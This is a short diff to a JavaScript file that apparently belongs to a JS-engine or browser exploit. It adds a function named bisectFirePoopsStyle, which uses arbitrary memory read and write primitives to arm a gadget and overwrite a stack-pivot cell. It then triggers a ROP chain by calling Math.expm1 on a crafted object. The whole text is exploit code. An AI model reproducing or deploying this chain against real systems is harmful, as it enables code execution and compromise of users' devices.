@@ -483,6 +483,24 @@ export function bisectHookPivotPoops(p, prep) {
     p.write8(prep.pivotCell, prep.M.S);
 }
 
+/** chain_poops callAddr — layout + arm G0 + hook pivotCell+0 + expm1. */
+export function bisectFirePoopsStyle(p, prep) {
+    if (!prep || !prep.M || !prep.G || !prep.pivotObj || !prep.mainMf)
+        throw new Error("bisectFirePoopsStyle: no prep");
+    layoutSmokeStack(prep);
+    p.write8(prep.mainMf, prep.G.G0);
+    prep.mainArmed = true;
+    const site = prep.pivotCell;
+    if (!prep._bisect) prep._bisect = {};
+    prep._bisect.pivotSite = site;
+    prep._bisect.pivotHookOff = 0;
+    prep._bisect.pivotSaved = p.read8(site);
+    prep._bisect.multiSaved = null;
+    p.write8(site, prep.M.S);
+    Math.expm1(prep.pivotObj);
+    return prep.M.frameDv.getUint32(0, true) | 0;
+}
+
 /** Bisect step 5 — Math.expm1 pivot (runs ROP chain). */
 export function bisectFireExpm1(p, prep) {
     if (!prep || !prep.pivotObj)
